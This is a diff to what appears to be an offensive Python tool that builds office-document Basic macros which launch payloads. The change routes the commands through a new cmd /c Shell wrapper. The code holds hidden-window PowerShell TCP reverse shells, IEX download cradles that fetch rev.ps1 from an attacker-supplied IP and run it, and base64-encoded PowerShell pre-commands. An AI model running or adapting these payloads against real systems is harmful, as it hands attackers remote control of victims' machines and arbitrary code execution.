@@ -26,6 +26,11 @@ def _macro(program, params):
     return f'Sub Main\n    Shell "{program}", 0, "{esc_p}"\nEnd Sub'
 
 
+def _shell_win(cmd):
+    esc = cmd.replace('"', '""')
+    return f'Sub Main\n    Shell("cmd /c {esc}")\nEnd Sub'
+
+
 def _linux(cmd):
     if "'" not in cmd:
         return _macro("/bin/bash", f"-c '{cmd}'")
@@ -35,11 +40,11 @@ def _linux(cmd):
 
 def _windows_ps(ps_cmd):
     encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
-    return _macro("powershell.exe", f"-nop -w hidden -e {encoded}")
+    return _shell_win(f"powershell -nop -w hidden -e {encoded}")
 
 
 def _windows_cmd(cmd):
-    return _macro("cmd.exe", f"/c {cmd}")
+    return _shell_win(cmd)
 
 
 def _pre_cmd_shell_line(cmd, target_os):
@@ -54,7 +59,7 @@ def _pre_cmd_shell_line(cmd, target_os):
         return f'    Shell "/bin/bash", 0, "{esc}", True'
     else:
         enc = base64.b64encode(cmd.encode("utf-16-le")).decode()
-        return f'    Shell "powershell.exe", 0, "-nop -w hidden -e {enc}", True'
+        return f'    Shell "cmd.exe", 1, "/c powershell -nop -w hidden -e {enc}", True'
 
 
 def inject_pre_cmds(macro, pre_cmds, target_os):
@@ -289,7 +294,7 @@ def _build_windows_payloads():
               "$s.Write($sb,0,$sb.Length);"
               "$s.Flush()};"
               "$c.Close()")
-        return _macro("powershell.exe", f"-nop -w hidden -c {ps}")
+        return _shell_win(f"powershell -nop -w hidden -c {ps}")
 
     add("ps-oneliner", "PowerShell TCPClient inline (no base64)", "powershell",
         _ps_oneliner)
@@ -306,22 +311,22 @@ def _build_windows_payloads():
               "$s.Write($sb,0,$sb.Length);"
               "$s.Flush()};"
               "$c.Close()")
-        return _macro("powershell.exe", f"-nop -w hidden -c {ps}")
+        return _shell_win(f"powershell -nop -w hidden -c {ps}")
 
     add("ps-oneliner-trycatch", "PowerShell inline with error handling", "powershell",
         _ps_oneliner_trycatch)
 
     # -- PowerShell download cradles --
     def _ps_download_cradle(ip, p, hp=80):
-        return _macro("powershell.exe",
-                      f"-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{hp}/rev.ps1')")
+        return _shell_win(
+            f"powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{hp}/rev.ps1')")
 
     add("ps-download-cradle", "Download cradle (Net.WebClient)",
         "powershell, http server", _ps_download_cradle)
 
     def _ps_download_iwr(ip, p, hp=80):
-        return _macro("powershell.exe",
-                      f"-nop -w hidden -c IEX(Invoke-WebRequest -Uri http://{ip}:{hp}/rev.ps1 -UseBasicParsing).Content")
+        return _shell_win(
+            f"powershell -nop -w hidden -c IEX(Invoke-WebRequest -Uri http://{ip}:{hp}/rev.ps1 -UseBasicParsing).Content")
 
     add("ps-download-iwr", "Download cradle (Invoke-WebRequest)",
         "powershell 3.0+, http server", _ps_download_iwr)
@@ -632,7 +637,7 @@ def main():
         if args.target_os == "linux":
             macro = _linux(args.cmd)
         else:
-            macro = _macro("powershell.exe", f"-nop -w hidden -c {args.cmd}")
+            macro = _shell_win(f"powershell -nop -w hidden -c {args.cmd}")
         label = f"custom — {args.cmd[:60]}"
     else:
         defaults = {"linux": "bash-tcp", "windows": "powershell"}
